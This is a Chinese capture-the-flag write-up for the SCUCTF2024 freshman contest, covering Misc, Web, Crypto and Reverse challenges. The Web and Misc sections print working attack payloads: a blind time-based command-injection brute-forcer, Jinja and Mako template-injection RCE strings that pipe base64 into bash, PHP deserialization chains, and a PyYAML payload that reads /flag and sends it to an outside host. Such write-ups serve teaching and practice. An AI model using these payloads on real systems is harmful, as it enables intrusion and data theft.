---
title: SCUCTF2024 新生赛 WP
createTime: 2025/04/30 19:15:13
permalink: /cybersecurity/5os6yjcm/
---
# <font style="color:#601BDE;">M</font><font style="color:#AE146E;">isc</font>
## <font style="color:#5C8D07;">关注公众号咋不算 CTF</font>
![](../../../images/2ae38ffb2f80c7e05500ea431626f5d3.png)

![](../../../images/a1f625e483f3ac8ac936c350ce24c632.png)

进入微信官网下载微信。

![](../../../images/c6eddf838a80486db88e2f1da6f3bac3.png)

登录微信。

![](../../../images/79811abc7fa8f8700d24c22834468291.png)



## <font style="color:#5C8D07;">我有权保持沉默</font>
IDA 逆向一下，其实 popen 已经实现任意命令执行了，只是关闭了所有的输出，没有回显。

这不就是无回显 RCE 吗？

这里可以通过 sleep 进行盲注，对每一个字节的内容进行爆破，通过响应的时间不同来得到正确答案。

空格可以用 `$IFS$9` 绕过，命令可以 base64 编码，然后用 echo 命令绕过一些特殊字符。

即 `echo base64编码后的命令 | base -d | bash`

如何获取 flag 中每个字符的内容呢？我们可以用 head 取出一部分，然后在取出的部分的基础上 tail 取最后一个字符，这样我们就可以取到我们指定位置上的字符了。

即 `head -c n /flag | tail -c 1`

我们判断当前字符是否符合条件，执行的命令就是：

`[$(head -c n /flag | tail -c 1)=爆破的字符] && sleep 1`

写一个脚本用 pwntools 交互即可。

```python
from pwn import *
import base64
import string
#context.log_level = 'debug'
box = string.ascii_letters + string.digits
print(box)
p = remote("223.129.86.2",34079)
p.recv()
flag = ""
part1 = "echo$IFS$9"
part3 = "$IFS$9|$IFS$9base64$IFS$9-d$IFS$9|$IFS$9bash"
p.recv()
for i in range(1,200):
    for c in string.printable:
        print(flag)
        part2 = "[ \"$(head -c " + str(i)  + " /flag | tail -c 1)\" = \"" + c + "\" ] && sleep 1"
        print(part2)
        payload = (part1+base64.b64encode(part2.encode()).decode()+part3)
        #print(payload)
        time1 = time.time()
        p.sendline(payload.encode())
        p.recvuntil(b': ')
        time2 = time.time()
        #print(time2-time1)
        if(time2-time1>0.9):
            flag+=c
            break
    print(flag)


```

![](../../../images/4e3d115e45905df58186aa9814d6312c.png)

## <font style="color:#5C8D07;">CTF一把梭？</font>
抱歉，一把梭不了。

拿到一个超大流量包，还有一个带密码的压缩包，密码应该是流量包里面的东西。

过滤 http 流，直接搜 pass 分组字节流。

![](../../../images/6983608a159f95a558245318c1028914.png)

![](../../../images/5f321ad0df3eb0b4f531bf1f1dee6cd8.png)

拿到密码。

解开压缩包就是 flag。

## <font style="color:#5C8D07;">SCU-OSINT</font>
容错很大，城市对了基本上就差不多了，百度识图能出大部分，不能出就谷歌识图。

p4，p7 里面有关键字，直接搜索。

p10 的图片在 t1d 空间里面，应该是在上海，随便点一个位置就对了。

```plain
[1][✅]4.473459,51.924184
[2][]
[3][]
[4][✅]114.264492,30.537959
[5][✅]-122.425496,37.785283
[6][✅]117.285432,31.870445
[7][✅]104.092491,30.650736
[8][✅]116.391348,40.004538
[9][✅]120.43611,36.095561
[10][✅]121.462492,31.255899


```



## <font style="color:#5C8D07;">无穷的尽头</font>
挺有意思的 mc 题，做题记录在下面的文档中。

```plain
失败的man好像去了72号维度

有序-有序-无序-有序-无序-有序-无序-有序-有序-有序-有序-无序-有序-无序-有序-无序-有序-无序-无序-无序-无序-有序-无序-有序-有序-有序-有序-有序-无序-有序-有序-无序-有序-有序-无序-无序-有序-无序-有序-有序-无序-有序-无序-有序-有序-无序-无序-有序-无序-有序-无序-有序-有序-无序-无序-有序-有序-有序-无序-有序-有序-无序-无序-无序-有序-无序-有序-无序-有序-有序-有序-无序-无序-无序-有序-有序-无序-无序-有序-有序-无序-有序-无序-有序-无序-无序-无序-有序-无序-无序-有序-无序-有序-有序-有序-无序-无序-无序-无序-无序

你相信命运吗？被命运选中的人，是我啊

二即均衡，三即新生，数质数吧，质数是谁也无法分割的数字

为了人类的幸福，所要克服的，便是命运啊，人是必须要上天堂的，我所追求的是，指引所有人到达那个全新的世界，感觉到了，位置来了，理解命运吧，时间要加速了：

『螺旋楼梯』，『独角仙』，『无花果塔』，『德蕾莎之道』，『特异点』，『天使』，『绣球花』，『秘密皇帝』

话已至此，时间加速，达到全新的世界吧！

aHR0cHM6Ly9wYW4ueHVubGVpLmNvbS9zL1ZPQnNLWldkc1VuZmdGN05acEV3Y0ZaY0ExP3B3ZD1ja2I4

其实他在69号维度

Exploit:
1. /fill ~ ~ ~ -50 210 90 minecraft:air

34-45-55-66-67-68-69

Wd5p2 34
AeSy8 45
iUq0c 55
Myqvm 66
MkdJK 67
qkoy7 68
sYyyw 69

scuctf{Wd5p2-AeSy8-iUqOc-Myqvm-MkdJK-qkoy7-sYyyw}


```

解题的关键是不要忽略地图中的细节，在第一张地图中拿到所有东西就可以去第二张图了。

第一张图会有一些恶心人的地方，可以用指令去绕过。

地图里面有死循环设置为冒险模式，我们可以用 fill 指令去填充方块，填充 air 就相当于删掉了方块。

第一张图还有一个不好打的怪，直接给自己开个抗性提升，然后 tp 出去，发现指令中心就在附近。

![](../../../images/73bf81c76b32eddacad04d946a4c48e6.png)

fill 把死循环的命令方块全部删掉。

然后就能开创造了。

![](../../../images/313f6e80432d2459ccfec42f2f83e6c9.png)

第一张图还能拿到一个类似路径的东西，我们知道起点、终点、联通情况，我们就能直接跑 BFS，把路径跑出来，在第二张图按照顺序走就行了。

```plain
34-45-55-66-67-68-69


```

第二张图也可以用类似地图一中的指令，然后就能开创造了，也可以开旁观者模式，找到核心值就行。

## <font style="color:#5C8D07;">问卷</font>
填完即可得到 flag。



# <font style="color:#601BDE;">W</font><font style="color:#AE146E;">eb</font>
## <font style="color:#5C8D07;">Web入门指北</font>
翻到最后，解一下 base64。

![](../../../images/2640c5b00176f3dcc0a7b72a2d7405b1.png)



## <font style="color:#5C8D07;">php_beginer</font>
```php
<?php
highlight_file(__FILE__);
$flag = file_get_contents("/flag");

if(isset($_GET['what_is[php'])){
    if(strpos($_REQUEST['what_is[php'], 'easy') !== false){
        echo "php is not so easy!T^T";
        die();
    }
    if(strpos($_SERVER['QUERY_STRING'], 'easy') !== false){
        echo "php is so hard!T^T";
        die();
    }
    if($_GET['what_is[php']==="php is so easy"){
        echo "yes, php is so easy!";
        echo $flag;
    }
}else{
    echo "nonono";
} 


```

首先是传参问题，是一个经典的绕过，把下划线换成左中括号即可。

最后要求变量必须是 php is so easy，这个是毋庸置疑的。

$_REQUEST 中，POST 的优先级高于 GET，我们可以随便 POST 一个绕过第一层。

第二层是 $_SERVER，他不会自动 urldecode，我们可以直接将传入的东西 url 编码，绕过这一层。

![](../../../images/389002bfd2a813dd6bb862def6c8b30f.png)

## <font style="color:#5C8D07;">ezPHP</font>
```php
 <?php
highlight_file(__FILE__);

if (preg_match('/[A-Za-z]|\^|~|%|\.|\$|\{|\}|\||\/|\?|\+|=|`| |\*|_|#/is', $_GET['exp'])) {
    die("no hack");
}else{
    @eval($_GET['exp']);
} 


```

RCE 绕过，可以用 8 进制绕过。

![](../../../images/6858ec1c93d10a98247cc510394dfd12.png)

## <font style="color:#5C8D07;">untar</font>
非预期。

可以上传 tar 文件，然后网站会自动将其解压。

看到文件名被原封不动地渲染出来，可能有 SSTI，试了一下，确实是。

那我们直接构造一个 payload，将其作为文件名，tar 压缩后直接上传即可。

注意文件名中有一些特殊符号不能出现，用 fenjing 跑一下就行了。

```python
{%set ca='%c'.__mul__(24)%(99,97,116,32,47,102,49,52,103,121,48,117,99,52,110,78,51,118,51,114,75,110,48,119)%}{{cycler.next.__globals__.__builtins__.__import__('os').popen(ca).read()}}
```

![](../../../images/8c834dd67be428d6efa70c47cde0c6b3.png)



## <font style="color:#5C8D07;">ez_yaml</font>
一上来就点一下 check，立马报错。

![](../../../images/f9fe4e121d0f4f2f7eb2e670beab714e.png)

考察的是 yaml 反序列化，用一些常规的 payload 都绕不过去，过滤了很多关键词。

这里可以使用 tuple 元组绕过，可以直接调用 python 中的 eval 函数。

可以打一发 pyjail，这里没打出来，于是用另一种方法把 /flag 的内容带出来，具体可以参考 [https://blog.ankursundara.com/pyyaml-cve/](https://blog.ankursundara.com/pyyaml-cve/)。

![](../../../images/7ab825ef347fa9b0e55eece243fcc4ce.png)

```yaml
- !!python/object/new:str
    args: []
    state: !!python/tuple
    - "from urllib import request;print(getattr(request, 'urlopen')('http://27.25.151.98:8080/'+getattr(open('/flag'), 'read')()))"
    - !!python/object/new:staticmethod
      args: [0]
      state:
        update: !!python/name:exec
```

![](../../../images/efb87f3ae436d9b4dcdbc21eb8aef2d9.png)

## <font style="color:#5C8D07;">Auth</font>
大致逻辑是这样的，首先前台是一个 php。

```php
 <?php

class auth{

    public $username;
    protected $passwd;
    public $auth;
    
    public function __wakeup(){
        $this->username="nobody";
    }

    public function Getflag(){
        if($this->username === 'admin' && $this->passwd == md5($this->passwd)){
            echo 'welcome!';
            $this->processHeadersAndRequest();
        }else{
            echo 'nono';
            echo $this->passwd;
            echo md5($this->passwd);
            echo $this->username;
        }
    }

    public function processHeadersAndRequest() {
        // 获取请求的所有 headers
        $headers = getallheaders();

        // 将 headers 的键和值都转换为小写字母
        $lowercase_headers = [];
        foreach ($headers as $key => $value) {
            $lowercase_headers[strtolower($key)] = strtolower($value);
        }

        // 检查 admin 字段是否包含 'true'
        if (isset($lowercase_headers['admin']) && strpos($lowercase_headers['admin'], 'true') !== false) {
            // 如果 admin 字段包含 'true'，返回错误信息
            echo json_encode(['error' => 'Unauthorized access']);
        } else {
            // 否则，继续请求并带着转换为小写的 headers 向后端发出请求
            $ch = curl_init('http://127.0.0.1:5000/check');

            // 构建请求头数组，并将键和值转换为小写
            $curl_headers = [];
            foreach ($lowercase_headers as $key => $value) {
                $curl_headers[] = "$key: $value";
            }

            // 设置 cURL 选项
            curl_setopt($ch, CURLOPT_HTTPHEADER, $curl_headers);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

            // 发出请求并获取响应
            $response = curl_exec($ch);
            curl_close($ch);

            // 返回后端的响应
            echo $response;
        }
    }
}

class backdoor{
    public $key;
    public function __destruct(){
        echo $this->key;
    }
}

class middleware{
    public $ware;
    public function __toString(){
        $this->ware->Getflag();
        return 0;
    }
}

if(isset($_POST['ser'])) {
    unserialize($_POST['ser']);
} else {
    highlight_file(__FILE__);
}



```

需要想办法进到 processHeadersAndRequest 里面，会向后台发送请求，验证 admin 请求头的值是否为 true，但是如果 admin 请求头的值已经是 true，就不会向后台发送请求。

```python
from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route('/check', methods=['GET', 'POST'])
def check_headers():
    # 获取请求头
    headers = {key.lower(): value for key, value in request.headers.items()}
    
    # 判断 'admin' 字段是否包含 'true'
    if 'admin' in headers and 'true' in headers['admin'].lower():
        try:
            # 打开指定文件并返回内容
            with open('/flag', 'r') as file:
                content = file.read()
            return content
        except FileNotFoundError:
            return "error", 404
    else:
        return "只有admin可以获得flag", 403

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5000)


```

php 那边就是一个简单的反序列化，有个 md5 自身相等绕过，然后还需要注意有 protected 属性，需要 url 编码后再传入，还有个 __wakeup 需要绕一下，直接篡改成员数量即可。

admin 请求头的绕过方法可以参考攻防世界的 ez_curl 题目。

![](../../../images/8f869d53cea09366d560058b17c4b0de.png)

![](../../../images/533594d6157765bf0492fe202a388d85.png)



## <font style="color:#5C8D07;">cl0udreve</font>
SICTF 原题+原文章，照着复现就好了，不多赘述。

[https://xz.aliyun.com/t/15669?u_atoken=23a103a32a0e6d88d92c6c3fc2cd7e3a&u_asig=0a472f8c17325260328835223e00c7](https://xz.aliyun.com/t/15669?u_atoken=23a103a32a0e6d88d92c6c3fc2cd7e3a&u_asig=0a472f8c17325260328835223e00c7)



## <font style="color:#5C8D07;">Math Master1.0</font>
偷懒，直接用 Math Master2.0 给的源码。

我们需要 1000 次答对问题，很明显需要脚本交互。

这里可以通过几个 api 获取数据。

直接用 requests 库交互比较麻烦，因为还涉及一些 SM4，SM2，SM3 的加解密，用 python 的库不太好实现，这里直接用 nodejs 写。

大致流程就是，先从 /api/expr 中得到表达式，进行计算，然后从 /api/sec 中获取公钥的密文，是用 SM4 加密的，key 和 iv 都可以在源码中找到。

计算出答案后，我们需要将 MathMaster 和计算出的结果拼接，并用刚才的公钥去加密该字符串。

最后进行 SM3 签名，将内容传入 /api/verify 验证答案，正确即可返回 success。

GPT 跑一个脚本秒了。

```javascript
const { sm3, sm2, sm4 } = require('sm-crypto');
const axios = require('axios');
const { CookieJar } = require('tough-cookie');
const { wrapper } = require('axios-cookiejar-support');

// 配置
const BASE_URL = "http://223.129.86.2:34078/";
const COOKIE_VALUE = 'ko4-sess=nOxQ2yXUUIHXU_bv5olkmnCnKpqdd4lF';
const SM4_KEY = "bb405999b06b7839c85a887a17c3d3f8";
const SM4_IV = "e4799dcac5e3017de93baf7b364693c3";

const API_ENDPOINTS = {
  key: 'api/sec',
  verify: 'api/verify',
  expr: 'api/getExpr',
};

// 设置Cookie和Axios实例
const cookieJar = new CookieJar();
cookieJar.setCookieSync(COOKIE_VALUE, BASE_URL);

const axiosInstance = wrapper(axios.create({
  jar: cookieJar,
  withCredentials: true,
  proxy: {
    protocol: 'http',
    host: '27.25.151.98',
    port: 8080
  }
}));

// 加密解密逻辑
async function fetchAndProcess() {
  for (let attempt = 1; attempt <= 1000; attempt++) {
    try {
      // 获取公钥密文
      const keyResponse = await axiosInstance.get(`${BASE_URL}${API_ENDPOINTS.key}`);
      const encryptedKey = keyResponse.data.p;

      // 解密公钥
      const decryptedKey = sm4.decrypt(encryptedKey, SM4_KEY, {
        mode: 'cbc',
        padding: 'pkcs#7',
        iv: SM4_IV
      });

      // 获取表达式
      const exprResponse = await axiosInstance.get(`${BASE_URL}${API_ENDPOINTS.expr}`);
      const expression = exprResponse.data.e;
      const evaluatedResult = eval(expression); // 动态计算表达式

      // 用SM2加密答案
      const answer = "MathMaster" + evaluatedResult;
      const encryptedAnswer = sm2.doEncrypt(answer, decryptedKey);

      // 签名请求数据
      const payload = { answer: encryptedAnswer };
      const nonce = '40af3bb57a9aa21a';
      const signature = sm3(nonce + JSON.stringify(payload), { key: decryptedKey });

      // 验证答案
      const verifyResponse = await axiosInstance.post(`${BASE_URL}${API_ENDPOINTS.verify}`, payload, {
        headers: {
          'Content-Type': 'application/json',
          'X-NONCE': nonce,
          'X-SIGN': signature
        }
      });

      console.log(`Attempt ${attempt}:`, verifyResponse.data);

    } catch (error) {
      console.error(`Error on attempt ${attempt}:`, error.message);
    }
  }
}

// 执行主函数
fetchAndProcess();


```

跑到 1000 会发现没有给 flag，很怪，直接用 burp 抓包去访问，把 cookie 改成 xxx，能看到 flag。

## <font style="color:#5C8D07;">Math Master 2</font>
在 1 的基础上，有了时间限制。

脚本还是一样的，改个次数就行了。

```javascript
const { sm3, sm2, sm4 } = require('sm-crypto');
const axios = require('axios');
const { CookieJar } = require('tough-cookie');
const { wrapper } = require('axios-cookiejar-support');

// 配置
const BASE_URL = "http://223.129.86.2:34078/";
const COOKIE_VALUE = 'ko4-sess=nOxQ2yXUUIHXU_bv5olkmnCnKpqdd4lF';
const SM4_KEY = "bb405999b06b7839c85a887a17c3d3f8";
const SM4_IV = "e4799dcac5e3017de93baf7b364693c3";

const API_ENDPOINTS = {
    key: 'api/sec',
    verify: 'api/verify',
    expr: 'api/getExpr',
};

// 设置Cookie和Axios实例
const cookieJar = new CookieJar();
cookieJar.setCookieSync(COOKIE_VALUE, BASE_URL);

const axiosInstance = wrapper(axios.create({
    jar: cookieJar,
    withCredentials: true,
    proxy: {
        protocol: 'http',
        host: '27.25.151.98',
        port: 8080
    }
}));

// 加密解密逻辑
async function fetchAndProcess() {
    for (let attempt = 1; attempt <= 62; attempt++) {
        try {
            // 获取公钥密文
            const keyResponse = await axiosInstance.get(`${BASE_URL}${API_ENDPOINTS.key}`);
            const encryptedKey = keyResponse.data.p;

            // 解密公钥
            const decryptedKey = sm4.decrypt(encryptedKey, SM4_KEY, {
                mode: 'cbc',
                padding: 'pkcs#7',
                iv: SM4_IV
            });

            // 获取表达式
            const exprResponse = await axiosInstance.get(`${BASE_URL}${API_ENDPOINTS.expr}`);
            const expression = exprResponse.data.e;
            const evaluatedResult = eval(expression); // 动态计算表达式

            // 用SM2加密答案
            const answer = "MathMaster" + evaluatedResult;
            const encryptedAnswer = sm2.doEncrypt(answer, decryptedKey);

            // 签名请求数据
            const payload = { answer: encryptedAnswer };
            const nonce = '40af3bb57a9aa21a';
            const signature = sm3(nonce + JSON.stringify(payload), { key: decryptedKey });

            // 验证答案
            const verifyResponse = await axiosInstance.post(`${BASE_URL}${API_ENDPOINTS.verify}`, payload, {
                headers: {
                    'Content-Type': 'application/json',
                    'X-NONCE': nonce,
                    'X-SIGN': signature
                }
            });

            console.log(`Attempt ${attempt}:`, verifyResponse.data);

        } catch (error) {
            console.error(`Error on attempt ${attempt}:`, error.message);
        }
    }
}

// 执行主函数
fetchAndProcess();


```

## <font style="color:#5C8D07;">MyBlog</font>
泄露了 www.zip，下载下来看看。

代码审计，是个 thinkphp 框架。

有 sql 注入，但是 WAF 拉满了，没什么用。

仔细看看发现有个任意文件读取，直接目录穿越出来，可以把头像换成文件的路径，就会以 base64 的形式读出来。

![](../../../images/325af507b9d7d995e7107de960233ca0.png)

![](../../../images/1483334a08f9246adfdb59c79c37eb5d.png)

![](../../../images/71d521d93f7b8be2c3d8ccbc82be6f89.png)



## <font style="color:#5C8D07;">ez_unserialize</font>
```php
 <?php
highlight_file(__FILE__);
function filter($password){
    $filter_arr = array("admin");
    $filter = '/'.implode("|",$filter_arr).'/i';
    return preg_replace($filter,"guest",$password);
}
class User{
    public $username;
    public $value;
    public function shell($unser){
        $ser = serialize($unser);
        if($ser!=$this->value){
            $key1 = $unser[0];
            $key2 = $unser[1];
            echo new $key1($key2);
        }
        
    }
    public function __destruct()
    {
        if($this->username == "admin"){
            $unser = unserialize($this->value);
            $this->shell($unser);
        }
    }
}

$user=unserialize(filter($_POST["user"]));



```

一共三层，第一层 `$this->username == "admin"` 是弱比较，可以把 `$this->username` 直接赋值成 true，这样就能绕过。

第二层是二次绕过，要求 **原对象 **和 **该对象被序列化后再反序列化后** 不一样，这里可以借助 `<font style="color:#4c4f69;background-color:#eff1f5;">__PHP_Incomplete_Class</font>`<font style="color:#4c4f69;background-color:#eff1f5;"> </font><font style="color:#000000;background-color:#eff1f5;">绕过。</font>

<font style="color:#000000;background-color:#eff1f5;">最后一层用 php 的内置类 </font>`<font style="color:#4c4f69;background-color:#eff1f5;">SplFileObject</font>`<font style="color:#4c4f69;background-color:#eff1f5;"> </font><font style="color:#000000;background-color:#eff1f5;">读取 flag 中的内容。</font>

```php
<?php
class Myclass{}
$myclass = new Myclass();
$myclass->abc = NULL;
$temp = Array(
    0 => "SplFileObject",
    1 => "/flag",
    2 => $myclass
);
echo serialize($temp)."\n";
$ser = "a:3:{i:0;s:13:\"SplFileObject\";i:1;s:5:\"/flag\";i:2;O:22:\"__PHP_Incomplete_Class\":1:{s:3:\"abc\";N;}}";
$xx = unserialize($ser);
print_r($xx);
class User{
    public $username = true;
    public $value = "a:3:{i:0;s:13:\"SplFileObject\";i:1;s:5:\"/flag\";i:2;O:22:\"__PHP_Incomplete_Class\":1:{s:3:\"abc\";N;}}";

}
$p = new User();
echo serialize($p);



```



## <font style="color:#5C8D07;">my_anonymous_board</font>
随便写一个留言，发现每一个留言都会有一个 id。

访问对应 id 的路由，就会得到该 id 对应的留言。

如果不存在这个 id，还是会把页面渲染出来。

![](../../../images/a710062c13ee46a566cfa0884865841b.png)

会不会有 SSTI 呢？

发现他刻意过滤了大括号，可是过滤了大括号怎么 SSTI 呢？

其实 SSTI 不止一种，还有很多模板引擎，其利用方式也不一样，比如说这里可以用 <%%> 也可以 SSTI。

这里用的是 mako 模板引擎，可以参考这个文章进行利用。

[https://xz.aliyun.com/t/12187?time__1311=GqGxRDniiQe7qGN4CxUxQwxWupGitaYKW4D](https://xz.aliyun.com/t/12187?time__1311=GqGxRDniiQe7qGN4CxUxQwxWupGitaYKW4D)

**<font style="color:#000000;">文章里面给出的 payload 是</font>**<font style="color:rgb(221, 17, 68);"> </font>`<font style="color:rgb(221, 17, 68);"><%str(__M_writer(str(__import__("os").system("id"))))%></font>`<font style="color:#000000;">，但是这里用不了，需要修一下，我们把 system 换成 popen("xxx").read()。</font>

![](../../../images/f7193da81141a26792ba13d683d3a564.png)

成功 RCE。

这里如果用斜杠字符的话会被识别，我们得想办法绕过斜杠，最简单的方法就是 echo 搭配 base64 绕过。

还需要 url 编码一下。

`<%str(__M_writer(str(__import__("os").popen("echo bHMgLw== | base64 -d | bash").read())))%>`

![](../../../images/d102cb6b14430dd3cee5bebb111358e1.png)

![](../../../images/2b6dcfbfa2ad1109aaa5a10c0b79719a.png)



# <font style="color:#601BDE;">C</font><font style="color:#AE146E;">rypto</font>
## <font style="color:#5C8D07;">古典密码</font>
```plain
你害怕吃日本的海鲜吗, 哎，怕的是水污染哦。

```

句子首字母是 nhpcrbdhxm   apdsswro ，最后几个刚好是 password 调换一下顺序，本来的password 依次对应 1~8。

## <font style="color:#5C8D07;">sign</font>
```python
from Ctypto.Util.number import bytes_to_long
flag = b'************'
flag = bytes_to_long(flag)
print(flag**2)


```

开根号就行了。

```python
from Ctypto.Util.number import long_to_bytes
from gmpy2 import iroot
m2=634224651564898754539998157442756001083664116199826003787455223670065793192082549055454281560984604909069350043903900173786578435523771936648969
flag = long_to_bytes(gmpy2.iroot(m2,2)[0])
print(flag)


```



## <font style="color:#5C8D07;">Funny</font>
![](../../../images/5fac4fdf4369d74467b3e518d81be1e6.png)

```python
from gmpy2 import *
f1 = -17337117227294603081644913925715986304757691186817314168716070675168728237679560788649529089548008347749038616949165538274455486179917458595151081640403539751423616759911713840638803490704488888721766198501634924947022411482611118431514836628403198910259213109382128421336826918304936929700914718767612296481855186054998920368855241548606650200550250310760914787293267642488292723273789390824832638679706543869841856637405754914855770290337227026645086808969790740018490395742739684465737948586702801081011607546494377177946129929765696444973369402105823853124703107856231998873101691105985504867357684501470651676994
f2 = 2581942792046579713395674014031211416173666863245901819258268603261755307243320667442197467723761019147008091786796111430664620522079713416215205447517403606615578802785520575916277968997248407919640482821112495366403204438080109398559116192012622524041467314942629801675105262865770389436746211454630897001963684781627802184497065030574782227270688908311334935704323921711566369173579
f3 = 44763444859879884038708658157008071880193344021551817387637745646314918339097045709994070424282107069715320569002772481919510646881596998094820773585351446686773947691955953853080332090535293214509733516261956478846204995740314555061149760847579734281394837479231038061498909195978778319116247773847103941535002072810562456449510361013529041463649306865813540918989501574478338995331113256493656141606708985410790426190958080972964284821663546051159974442013349466348868665365554757942129730848231929177240461721610495864022353897821521000498197455840419046869625025867297390870700359575928362411304198406562760301775578261436870821464216607554428437454146143979543436426533991556100659579987696593675091495042256176364675835021975637786279647637390302897317143393283841691008109978628103890163229468157845393583463465476351193506396823483251415221884952122736937783458347186979788716669539126989667368466070307821665482034597718884079590052885746185215558146479388778532643628478292807033377728626986
n = (f3+0x401)//f2
for r in range(-0x401,0x402):
    p_add_q = f1+n-r
    buffer = (p_add_q*p_add_q)-4*n
    val1,val2 = gmpy2.iroot(buffer,2)
    if(val2 != 1):
        continue
    p = p_add_q+val1
    q = p_add_q-p
    print("%d,%d,%d"%(r,p,q))

    
```

![](../../../images/e4e7e9ab7d27f98837d056416d0c27c0.png)

```python
from Crypto.Util.number import long_to_bytes
from gmpy2 import invert
f4 = 3208444748775539679899380105832032233046107978893625201975742354386860817426404645710580786436813251982166398072123607126977075577443383253105784221005811832541925472428712962137721775112788798165406344192849479715687308430038258994227891625783250837464249165684689659268781499736581159743935510110138755706049390867510171680853806801742557749628401098886471260368642083089738695645932070375224567225560860488495595243411181755476610570353182439447822323563265416597218638205622062808123779413183491848361433630614746423079089799312966780304142986457944759368616398610715556048774076274844317753805775880116020089014
e = 65537
p = 153427103974418719544419406258493511020150443477637702597746483814150954755074791792941629143424323372952861739360195469122679380312579050052908701206923224982233720758410695499610865878670625104586143824811001310486280487058427856618172868206549381881516940781212037789957049085298008493488349137836616424991
q = 112999051524724493984540652706668474289153459570577286302519555588693406643094878611330847883900018864558900635994343923025526015488493881949526130631958256095295072723172452685279504037382956062196189297502035275834736568268073519915186472071481082944870471033384862155253352503573512836280436471333887547199
n = p*q
phi = (p-1)*(q-1)
d = invert(e,phi)
m = pow(f4,d,n)
print(m,"\n",long_to_bytes(m))


```

![](../../../images/48984e02c2b83043da84e45cc7ff75aa.png)

```plain
b'fake:scuctf{777244834953575180597136747909171714123072108442216566907495718016920431857250692477}'
```

再 long_to_bytes 一次。



## <font style="color:#5C8D07;">Sh0wTime</font>
![](../../../images/d384825fd44b48fca0e43135d81728b0.png)

<font style="color:#000000;">根据 </font>[<font style="color:#117CEE;">此处</font>](https://hasegawaazusa.github.io/ecdsa-note.html)<font style="color:#000000;"> 的相关内容，可得：</font>

![](../../../images/b41c4d6d2abfda5a1498638814a52d38.png)

## <font style="color:#5C8D07;">scu_ezxor</font>
![](../../../images/d897393bd8eb0cb4e3e9ea8e8ddf50c5.png)

# <font style="color:#601BDE;">R</font><font style="color:#AE146E;">everse</font>
## <font style="color:#5C8D07;">ez_IDA</font>
![](../../../images/ebf408f35ef320847d7fd21c77b098d8.png)

IDA 打开就是 flag。



## <font style="color:#5C8D07;">BabyApk</font>
```java
package com.example.apk1;

import android.os.Bundle;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;
import androidx.activity.j;
import com.example.apk1.MainActivity;

/* loaded from: classes.dex */
public final class MainActivity extends j {

    /* renamed from: r, reason: collision with root package name */
    public static final /* synthetic */ int f431r = 0;

    /* JADX WARN: Type inference failed for: r2v0, types: [Q.a, java.lang.Object] */
    @Override // androidx.activity.j, B.a, android.app.Activity
    public final void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        View inflate = getLayoutInflater().inflate(R.layout.input_layout, (ViewGroup) null);
        final EditText editText = (EditText) inflate.findViewById(R.id.editText);
        Button button = (Button) inflate.findViewById(R.id.submit_button);
        final ?? obj = new Object();
        obj.f145a = "HappyHappyHappy!";
        obj.f146b = new int[256];
        for (int i2 = 0; i2 < 256; i2++) {
            obj.f146b[i2] = i2;
        }
        button.setOnClickListener(new View.OnClickListener() { // from class: Q.b
            @Override // android.view.View.OnClickListener
            public final void onClick(View view) {
                String str;
                int i3 = MainActivity.f431r;
                a aVar = obj;
                W.a.k(aVar, "$baby");
                MainActivity mainActivity = this;
                W.a.k(mainActivity, "this$0");
                String obj2 = editText.getText().toString();
                W.a.k(obj2, "value");
                aVar.f145a = obj2;
                int i4 = aVar.f147c + 1;
                aVar.f147c = i4;
                int[] iArr = aVar.f146b;
                if (i4 == 987654321) {
                    String valueOf = String.valueOf(i4);
                    int i5 = 0;
                    for (int i6 = 0; i6 < 256; i6++) {
                        i5 = (valueOf.charAt(i6 % valueOf.length()) + (i5 + iArr[i6])) % 256;
                        int i7 = iArr[i6];
                        iArr[i6] = iArr[i5];
                        iArr[i5] = i7;
                    }
                }
                Integer[] numArr = {236, 200, 172, 220, 111, 134, 57, 11, 151, 230, 221, 180, 7, 230, 75, 152, 178, 118, 70, 186, 142, 31, 10};
                String str2 = aVar.f145a;
                int length = str2.length();
                int[] iArr2 = new int[length];
                int length2 = str2.length();
                int i8 = 0;
                int i9 = 0;
                for (int i10 = 0; i10 < length2; i10++) {
                    char charAt = str2.charAt(i10);
                    i8 = (i8 + 1) % 256;
                    int i11 = iArr[i8];
                    i9 = (i9 + i11) % 256;
                    iArr[i8] = iArr[i9];
                    iArr[i9] = i11;
                    iArr2[i8 - 1] = charAt ^ iArr[(iArr[i8] + i11) % 256];
                }
                int i12 = 0;
                int i13 = 0;
                while (true) {
                    if (i12 < length) {
                        int i14 = i13 + 1;
                        if (iArr2[i12] != numArr[i13].intValue()) {
                            str = "Try again";
                            break;
                        } else {
                            i12++;
                            i13 = i14;
                        }
                    } else {
                        str = "You know what you want";
                        break;
                    }
                }
                Toast.makeText(mainActivity, str, 0).show();
            }
        });
        setContentView(inflate);
    }
}


```

jadx 反编译一下，发现加密程序就是个 RC4，注意 key 是 987654321。

![](../../../images/8cb513fff71c4a7313bb894a050db280.png)

## <font style="color:#5C8D07;">白给蟒蛇</font>
python 逆向，用工具反编译出源码。

```python
# uncompyle6 version 3.9.1
# Python bytecode version base 3.8.0 (3413)
# Decompiled from: Python 3.6.12 (default, Feb  9 2021, 09:19:15) 
# [GCC 8.3.0]
# Embedded file name: main.py
flag = [
 18, 19, 42, 84, 75, 113, 53, 42, 60, 98, 109, 126, 73, 42, 21, 44, 
 82, 54, 84, 32, 140, 48, 101, 218, 92, 83, 210, 55, 51, 160, 148, 
 129, 253]
input_str = input("input your str:")
if len(input_str) != 33:
    print("Oh your input is wrong!!!")
result = [ord(i) for i in list(input_str)]
for i in range(33):
    result[i] ^= result[(i - 3 + 33) % 33]
    result[i] += i
else:
    for i, j in zip(result, flag):
        if i != j:
            print("Oh your input is wrong!!!")
            exit(0)
    else:
        print("you get the flag! it's: ", input_str)
        

```

简单异或，倒着写回去即可。

```python
enc = [
 18, 19, 42, 84, 75, 113, 53, 42, 60, 98, 109, 126, 73, 42, 21, 44,
 82, 54, 84, 32, 140, 48, 101, 218, 92, 83, 210, 55, 51, 160, 148,
 129, 253]
flag = ""
for i in range(len(enc)-1,0,-1):
    enc[i] = enc[i] - i
    enc[i] ^= enc[(i-3+33)%33]
for i in enc:
    flag += chr(i)
print(flag)


```

![](../../../images/446ac13711f85335e960d11eb120c15b.png)

:::danger
这里写得有点小问题，把第一个字符换成 S 就行。

:::



## <font style="color:#5C8D07;">简单算术</font>
